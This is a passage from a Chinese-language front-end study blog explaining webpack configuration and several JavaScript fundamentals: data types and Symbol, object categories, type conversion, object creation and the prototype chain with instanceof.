class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> merge = <span class="built_in">require</span>(<span class="string">'webpack-merge'</span>)</span><br><span class="line"><span class="keyword">const</span> utils = <span class="built_in">require</span>(<span class="string">'./utils'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">  <span class="comment">// 入口</span></span><br><span class="line">  entry: &#123;</span><br><span class="line">    app: <span class="string">'./src/main.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 出口</span></span><br><span class="line">  output: &#123;</span><br><span class="line">    path: config.build.assetsRoot,</span><br><span class="line">    filename: <span class="string">'[name].js'</span>,</span><br><span class="line">    publicPath: process.env.NODE_ENV === <span class="string">'production'</span></span><br><span class="line">      ? config.build.assetsPublicPath</span><br><span class="line">      : config.dev.assetsPublicPath</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 加载器配置（需要加载器转化的模块类型）</span></span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="string">'/\.css$/'</span>,</span><br><span class="line">        use: [ <span class="string">'style-loader'</span>, <span class="string">'css-loader'</span> ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 插件</span></span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">      <span class="string">'process.env'</span>: <span class="built_in">require</span>(<span class="string">'../config/dev.env'</span>)</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> webpack.HotModuleReplacementPlugin(),</span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      filename: <span class="string">'index.html'</span>,</span><br><span class="line">      template: <span class="string">'index.html'</span>,</span><br><span class="line">      inject: <span class="literal">true</span></span><br><span class="line">    &#125;),</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = config</span><br></pre></td></tr></table></figure>
<p>一个相对比较全面的配置主要包含五个部分： 入口，出口，加载器，插件，模式。分别指定了开始读取文件的位置，编译后输出文件的路径，ES6语法转化加载器，更复杂功能的插件以及指定执行的环境变量。</p>
</li>
</ul>
<ol start="3">
<li>区别<br><code>gulp</code> 和 <code>grunt</code> 是流管理工具，通过一个个task配置执行用户需要的功能，如格式检验，代码压缩等，值得一提的是，经过这两者处理的代码只是局部变量名被替换简化，整体并没有发生改变，还是你的代码。</li>
</ol>
<p>而 <code>webpack</code> 则进行了更彻底的打包处理，更加偏向对模块语法规则进行转换。主要任务是突破浏览器的鸿沟，将原本浏览器不能识别的规范和各种各样的静态文件进行分析，压缩，合并，打包，最后生成浏览器支持的代码，因此，<code>webapck</code> 打包过后的代码已经不是你写的代码了，或许你再去看，已经看不懂啦！</p>
<hr>
<h2 id="JavaScript的数据类型（按存储方式区分）："><a href="#JavaScript的数据类型（按存储方式区分）：" class="headerlink" title="JavaScript的数据类型（按存储方式区分）："></a>JavaScript的数据类型（按存储方式区分）：</h2><ol>
<li><p>五种基本数据类型（值类型）：<code>Null</code>、<code>Undefined</code>、<code>Boolean</code>、<code>String</code>、<code>Number</code>，是<strong>不可拆分</strong>的数据类型，存在于<strong>栈</strong>中。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">b = <span class="number">200</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// 100</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>一种复杂数据类型（引用类型）：统称 <code>Object</code> ，包括<code>Object</code>、<code>Array</code>、<code>Function</code>、<code>Date</code>、<code>RegExp</code>、<code>String</code>、<code>Boolean</code>、<code>Error</code>和自定义类，也就是通常意义上所说的<strong>类</strong>，存在于<strong>堆</strong>中，引用类型会共用存储空间。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">age</span>: <span class="number">18</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">b.age = <span class="number">20</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.age); <span class="comment">// 20</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ES6新增一种Symbol类型</p>
<blockquote>
<p>参考：<a href="http://es6.ruanyifeng.com/#docs/symbol" target="_blank" rel="noopener">http://es6.ruanyifeng.com/#docs/symbol</a></p>
</blockquote>
<p>值不唯一，通常用作对象的“键”值或私有属性</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Symbol</span>() <span class="comment">// Symbol()</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">Symbol</span>() <span class="comment">// 'symbol'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Symbol</span>() === <span class="built_in">Symbol</span>() <span class="comment">// false</span></span><br><span class="line"><span class="comment">// 为了做区分，可设置一个参数作为描述</span></span><br><span class="line"><span class="built_in">Symbol</span>(<span class="string">'ZhangSan'</span>) === <span class="built_in">Symbol</span>(<span class="string">'LiSi'</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 属性</span></span><br><span class="line"><span class="built_in">Symbol</span>().description <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">Symbol</span>(<span class="string">'ZhangSan'</span>).description <span class="comment">// ZhangSan</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法：</span></span><br><span class="line"><span class="built_in">Symbol</span>().toString() <span class="comment">// "Symbol()"</span></span><br><span class="line"><span class="built_in">String</span>(<span class="built_in">Symbol</span>()) <span class="comment">// "Symbol()"</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="built_in">Symbol</span>()) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="built_in">Symbol</span>()) <span class="comment">//  TypeError: Cannot convert a Symbol value to a number</span></span><br></pre></td></tr></table></figure>
<p>设置对象Symbol属性的方法，同样适用于普通对象：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sys = <span class="built_in">Symbol</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一种</span></span><br><span class="line"><span class="keyword">let</span> a = &#123;&#125;</span><br><span class="line">a[sys] = <span class="string">'Hello, Symbol'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种</span></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  [sys]: <span class="string">'Hello, Symbol'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三种</span></span><br><span class="line"><span class="keyword">let</span> c = &#123;&#125;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(c, sys, &#123; <span class="attr">value</span>: <span class="string">'Hello, Symbol'</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a[sys], b[sys], c[sys]) <span class="comment">// 都输出：'Hello, Symbol'</span></span><br><span class="line"><span class="comment">// 注意：不用使用a.sys来获取值，因为点运算符后面总是字符串</span></span><br></pre></td></tr></table></figure>
<p>例如，一个班级下有很多学生，数据结构如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> classRoom = &#123;</span><br><span class="line">  <span class="string">'Lily'</span>: [<span class="number">1</span>, <span class="number">18</span>, <span class="string">'BeiJing'</span>], <span class="comment">// id、age、address</span></span><br><span class="line">  <span class="string">'Mary'</span>: [<span class="number">2</span>, <span class="number">19</span>, <span class="string">'ShangHai'</span>],</span><br><span class="line">  <span class="string">'Lily'</span>: [<span class="number">3</span>, <span class="number">20</span>, <span class="string">'TianJin'</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Lily: (3) [3, 20, "TianJin"]</span></span><br><span class="line"><span class="comment">  Mary: (3) [2, 19, "ShangHai"]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>输出时发现后面的Lily把前面的覆盖了，这个时候我们可以使用Symbol来改写</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> classRoom = &#123;</span><br><span class="line">  [<span class="built_in">Symbol</span>(<span class="string">'Lily'</span>)]: [<span class="number">1</span>, <span class="number">18</span>, <span class="string">'BeiJing'</span>], <span class="comment">// id、age、address</span></span><br><span class="line">  [<span class="built_in">Symbol</span>(<span class="string">'Mary'</span>)]: [<span class="number">2</span>, <span class="number">19</span>, <span class="string">'ShangHai'</span>],</span><br><span class="line">  [<span class="built_in">Symbol</span>(<span class="string">'Lily'</span>)]: [<span class="number">3</span>, <span class="number">20</span>, <span class="string">'TianJin'</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Symbol(Lily): (3) [1, 18, "BeiJing"]</span></span><br><span class="line"><span class="comment">  Symbol(Mary): (3) [2, 19, "ShangHai"]</span></span><br><span class="line"><span class="comment">  Symbol(Lily): (3) [3, 20, "TianJin"]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>以 <code>Symbol</code> 作为键值创建的对象是不可遍历的，没有 <code>for</code>、<code>for...in</code>、<code>for...of</code> 等方法，也不会被 <code>Object.keys()</code>、<code>Object.getOwnPropertyNames()</code>、<code>JSON.stringify()</code> 返回。</p>
<p>但是，它也不是私有属性，有一个 <code>Object.getOwnPropertySymbols()</code> 方法，可以获取指定对象的所有 <code>Symbol</code> 属性名。该方法返回一个数组，成员是当前对象的所有用作属性名的 <code>Symbol</code> 值。</p>
<p>以上面的classRoom为例：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sysArr = <span class="built_in">Object</span>.getOwnPropertySymbols(classRoom)</span><br><span class="line"><span class="built_in">console</span>.log(sysArr)</span><br><span class="line"><span class="comment">// [Symbol(Lily), Symbol(Mary), Symbol(Lily)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> classRoomArr = sysArr.map(<span class="function"><span class="params">sys</span> =&gt;</span> classRoom[sys])</span><br><span class="line"><span class="built_in">console</span>.log(classRoomArr)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  输出一个二维码数组</span></span><br><span class="line"><span class="comment">  0: (3) [1, 18, "BeiJing"]</span></span><br><span class="line"><span class="comment">  1: (3) [2, 19, "ShangHai"]</span></span><br><span class="line"><span class="comment">  2: (3) [3, 20, "TianJin"]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<h2 id="JavaScript三大对象"><a href="#JavaScript三大对象" class="headerlink" title="JavaScript三大对象"></a>JavaScript三大对象</h2><ol>
<li><p>本地对象，如 <code>Object</code>、<code>Array</code>、<code>Function</code>、<code>Date</code>、<code>RegExp</code>、<code>String</code>、<code>Boolean</code>、<code>Error</code></p>
<ul>
<li>这些引用类型在运行过程中需要通过 <code>new</code> 来创建所需的实例对象。</li>
</ul>
</li>
<li><p>内置对象，如 <code>Global</code>、<code>Math</code>、(<code>JSON</code>)</p>
<ul>
<li>在 ECMAScript 程序开始执行前就存在，本身就是实例化内置对象，开发者无需再去实例化。</li>
<li>内置对象是本地对象的子集。</li>
</ul>
</li>
<li><p>宿主对象</p>
<ul>
<li>对于嵌入到网页中的JS来说，其宿主对象就是浏览器提供的对象，浏览器对象有很多，如 <code>Window</code> 和 <code>Document</code> 等。</li>
<li>所有的 <code>DOM</code> 和 <code>BOM</code> 对象都属于宿主对象。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="强制（显式）类型转换和隐式类型转换"><a href="#强制（显式）类型转换和隐式类型转换" class="headerlink" title="强制（显式）类型转换和隐式类型转换"></a>强制（显式）类型转换和隐式类型转换</h2><h3 id="强制（显式）类型转换"><a href="#强制（显式）类型转换" class="headerlink" title="强制（显式）类型转换"></a>强制（显式）类型转换</h3><ol>
<li><p>调用方法</p>
<ul>
<li>转换成字符串 toString</li>
<li>转换成数字 parseInt、parseFloat</li>
</ul>
</li>
<li><p>调用构造函数</p>
<ul>
<li>Number()</li>
<li>Boolean()</li>
<li>String()</li>
</ul>
</li>
</ol>
<h3 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h3><p>  不同类型的变量比较要先转类型，叫做类型转换，类型转换也叫隐式转换。<br>  隐式转换通常发生在运算符加减乘除，等于，还有小于，大于等。</p>
<ol>
<li><p>四则运算</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="string">'2'</span> = <span class="number">12</span>; <span class="comment">// 数字会先转换成字符串</span></span><br><span class="line"><span class="number">6</span> / <span class="string">'2'</span> = <span class="number">3</span>;</span><br><span class="line"><span class="string">'6'</span> / <span class="number">2</span> = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span> - <span class="string">'1'</span> = <span class="number">1</span>; <span class="comment">// 字符串会先转换成数字</span></span><br><span class="line"><span class="string">'2'</span> - <span class="number">1</span> = <span class="number">1</span>;</span><br><span class="line"><span class="number">2</span> * <span class="string">'3'</span> = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> + <span class="literal">true</span> = <span class="number">2</span>;</span><br><span class="line"><span class="number">1</span> + <span class="literal">false</span> = <span class="number">1</span>;</span><br><span class="line"><span class="number">1</span> + <span class="literal">undefined</span> = <span class="literal">NaN</span>;</span><br><span class="line"><span class="number">1</span> + <span class="literal">null</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">10</span> &amp;&amp; <span class="number">0</span>; <span class="comment">// 0</span></span><br><span class="line"><span class="string">''</span> || <span class="string">'abc'</span>; <span class="comment">// abc</span></span><br><span class="line">!<span class="built_in">window</span>.abc; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">null</span>; <span class="comment">// true</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"><span class="string">'0'</span> == <span class="number">0</span>; <span class="comment">// true</span></span><br><span class="line"><span class="number">0</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"><span class="string">'0'</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 拓展：判断一个变量会被当做 true 还是 false</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">console</span>.log(!!a);</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断语句<br><code>if</code> 语句其中的判断条件会进行类型的转换</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (some) &#123;&#125;</span><br><span class="line"><span class="comment">// 等效于</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Boolean</span>(some)) &#123;&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><h3 id="创建对象的几种方式"><a href="#创建对象的几种方式" class="headerlink" title="创建对象的几种方式"></a>创建对象的几种方式</h3><p>  1、字面量法<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;<span class="attr">name</span>: <span class="string">'o1'</span>&#125;;</span><br></pre></td></tr></table></figure></p>
<p>  2、构造函数法（构造函数首字母大写）<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o2 = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;<span class="attr">name</span>: <span class="string">'o2'</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> M = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="comment">// return this // 默认有这一行</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> M(<span class="string">'o3'</span>); <span class="comment">// 实例</span></span><br></pre></td></tr></table></figure></p>
<p>  3、Object.create()法<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o4 = <span class="built_in">Object</span>.create(&#123;<span class="attr">name</span>: <span class="string">'o4'</span>&#125;);</span><br></pre></td></tr></table></figure></p>
<p>  以上的运行结果如下：<br>  <img src="../images/javascript/js_object_result.png" width="60%" title="几种创建对象的运行结果"></p>
<p>  我们看到o3和o4的运行结果有些不一样，o3前面的M表示构造函数，o4却不显示属性</p>
<p>  但是运行<code>o4.name</code>发现其实是有值的，具体原因参考：<a href="https://www.cnblogs.com/leijee/p/7490822.html" target="_blank" rel="noopener">leijee blog</a><br>  <img src="../images/javascript/js_object_result2.png" width="60%" title=""></p>
<p>  1其实是2的一个语法糖，如果要创建一个空对象<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> o2 = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="built_in">Object</span>.create(&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> o4 = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></p>
<p>  只有o4是没有 <code>__proto__</code> 属性的，它没有继承 Object.prototype 原型链上的属性或者方法,例如：<code>toString()</code>, <code>hasOwnProperty()</code>等方法</p>
<h3 id="构造函数扩展"><a href="#构造函数扩展" class="headerlink" title="构造函数扩展"></a>构造函数扩展</h3><ol>
<li><code>var arr = []</code> 其实是 <code>var a = new Array()</code> 的语法糖；</li>
<li><code>var obj = {}</code> 其实是 <code>var a = new Object()</code> 的语法糖；</li>
<li><code>function Foo(){}</code> 其实是 <code>var Foo = new Function(){}</code> 的语法糖；</li>
</ol>
<p>即 arr 的构造函数是 <code>Array</code>, obj 的构造函数是 <code>Object</code>，Foo 的构造函数是 <code>Function</code>。</p>
<h3 id="原型规则"><a href="#原型规则" class="headerlink" title="原型规则"></a>原型规则</h3><ul>
<li><p>规则1：所有的引用类型（数组、对象、函数），都具有对象特性，可自由扩展属性（null 除外）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.a = <span class="number">100</span>; <span class="comment">// &#123;a: 100&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line">arr.a = <span class="number">100</span>; <span class="comment">// [a: 100]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">fn.a = <span class="number">100</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>规则2：所有的引用类型（数组、对象、函数），都有一个 <code>__proto__</code> (隐式原型) 属性，属性值是一个普通的对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(arr.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(fn.__proto__);</span><br></pre></td></tr></table></figure>
<p>结果如下图：<br><img src="../images/javascript/js__proto__.png" width="80%" title="__proto__属性"></p>
</li>
</ul>
<ul>
<li><p>规则3：所有的函数，都有一个 <code>prototype</code> (显示原型) 属性，属性值是一个普通的对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(fn.prototype); <span class="comment">// &#123;constructor: ƒ&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>规则4：所有的引用类型（数组、对象、函数），<code>__proto__</code> (隐式属性) 属性值指向它的构造函数的 <code>prototype</code> (显示原型) 属性值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj.__proto__ === <span class="built_in">Object</span>.prototype); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.__proto__ === <span class="built_in">Array</span>.prototype); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(fn.__proto__ === <span class="built_in">Function</span>.prototype); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>规则5：当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的 <code>__proto__</code>（即它的构造函数的 <code>prototype</code>）中去寻找，如果一层没有找到，就继续往上查找，一直到 <code>Object.prototype</code> 为止。因为 <code>Object.prototype</code> 等于 <code>null</code> 会自动停止。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 扩展属性（规则1）</span></span><br><span class="line">Foo.prototype.alertName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个实例f</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> Foo(<span class="string">'zhangsan'</span>);</span><br><span class="line"><span class="comment">// 扩展属性（规则1）</span></span><br><span class="line">f.printName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line">f.printName();</span><br><span class="line">f.alertName(); <span class="comment">// (规则5)</span></span><br><span class="line"><span class="comment">// f本身没有 alertName 属性，它会去它自身的隐式原型 即f.__proto__ (也即是它的构造函数的显示原型 Foo.prototype)中去寻找这个属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f.toString(); <span class="comment">// (规则5)</span></span><br><span class="line"><span class="comment">// f本身没有 toString 属性，它会去它自身的隐式原型 即f.__proto__ (也即是它的构造函数的显示原型 Foo.prototype)中去寻找这个属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 但是 Foo.prototype 中并没有找到这个属性，但是因为 Foo.prototype 本身也是一个对象，所以会继续向上寻找。</span></span><br><span class="line"><span class="comment">// 即f.__proto__.__proto__（也即是Foo.prototype.__proto__，也即是Foo.prototype 的构造函数Object.prototype中查找）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最终发现了toString</span></span><br><span class="line"></span><br><span class="line">f.abc();</span><br><span class="line"><span class="comment">// 直到Object.prototype.__proto__ = null，也没有找到abc属性，即停止。</span></span><br><span class="line"></span><br><span class="line">f.__proto__ === Foo.prototype; <span class="comment">// true</span></span><br><span class="line">f.__proto__.__proto__  === Foo.prototype.__proto__; <span class="comment">// true</span></span><br><span class="line">Foo.prototype.__proto__ === <span class="built_in">Object</span>.prototype; <span class="comment">// true</span></span><br><span class="line">f.__proto__.__proto__ === <span class="built_in">Object</span>.prototype; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><img src="../images/javascript/js_prototype2.png" width="100%" title="原型链图解"></p>
</li>
</ul>
<h3 id="循环对象自身的属性"><a href="#循环对象自身的属性" class="headerlink" title="循环对象自身的属性"></a>循环对象自身的属性</h3><p>对于上例，循环f自身的属性：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">in</span> f) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f.hasOwnProperty(item)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// name</span></span><br><span class="line"><span class="comment">// printName</span></span><br></pre></td></tr></table></figure></p>
<h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f <span class="keyword">instanceof</span> Foo; <span class="comment">// f是否是Foo的一个实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断逻辑是：</span></span><br><span class="line"><span class="comment">// f的 __proto__ 一层一层往上，能否对应到 Foo.prototype，结果为true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同理：</span></span><br><span class="line">f <span class="keyword">instanceof</span> <span class="built_in">Object</span>; <span class="comment">// f是否是Object的一个实例，结果为true</span></span><br></pre></td></tr></table></figure>
